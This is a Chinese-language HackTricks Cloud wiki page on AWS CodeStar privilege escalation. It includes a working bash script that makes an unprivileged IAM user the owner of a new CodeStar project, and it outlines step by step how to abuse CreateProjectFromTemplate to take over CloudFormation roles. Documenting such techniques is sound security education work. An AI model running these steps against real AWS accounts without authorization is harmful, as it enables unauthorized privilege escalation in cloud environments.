# AWS - Codestar提权

{% hint style="success" %}
学习并练习AWS黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习GCP黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。

</details>
{% endhint %}

## Codestar

您可以在以下位置找到有关Codestar的更多信息：

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

拥有这些权限后，您可以**滥用Codestar IAM角色**通过**云形成模板**执行**任意操作**。请查看以下页面：

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

此技术使用`codestar:CreateProject`创建Codestar项目，并使用`codestar:AssociateTeamMember`将IAM用户设为新CodeStar **项目**的**所有者**，从而授予他们一个带有一些额外权限的**新策略**。
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
如果您已经是**项目成员**，可以使用权限**`codestar:UpdateTeamMember`**将您的角色**更新为所有者**，而不是`codestar:AssociateTeamMember`。

**潜在影响：** 提升至生成的codestar策略。您可以在以下位置找到该策略的示例：

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **创建新项目：**
- 利用**`codestar:CreateProjectFromTemplate`**操作来启动创建新项目。
- 成功创建后，将自动授予**`cloudformation:UpdateStack`**访问权限。
- 此访问权限专门针对与`CodeStarWorker-<通用项目名称>-CloudFormation` IAM角色相关联的堆栈。

2. **更新目标堆栈：**
- 利用获得的CloudFormation权限，继续更新指定的堆栈。
- 堆栈的名称通常符合以下两种模式之一：
- `awscodestar-<通用项目名称>-infrastructure`
- `awscodestar-<通用项目名称>-lambda`
- 具体名称取决于所选模板（参考示例利用脚本）。

3. **访问和权限：**
- 更新后，您将获得与堆栈关联的**CloudFormation IAM角色**分配的功能。
- 注意：这并不会直接提供完整的管理员特权。可能需要环境中的其他配置错误资源来进一步提升特权。

有关更多信息，请查看原始研究：[https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/)。\
您可以在[https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)找到利用程序。

**潜在影响：** 提升至cloudformation IAM角色。

{% hint style="success" %}
学习并实践AWS黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并实践GCP黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。

</details>
{% endhint %}
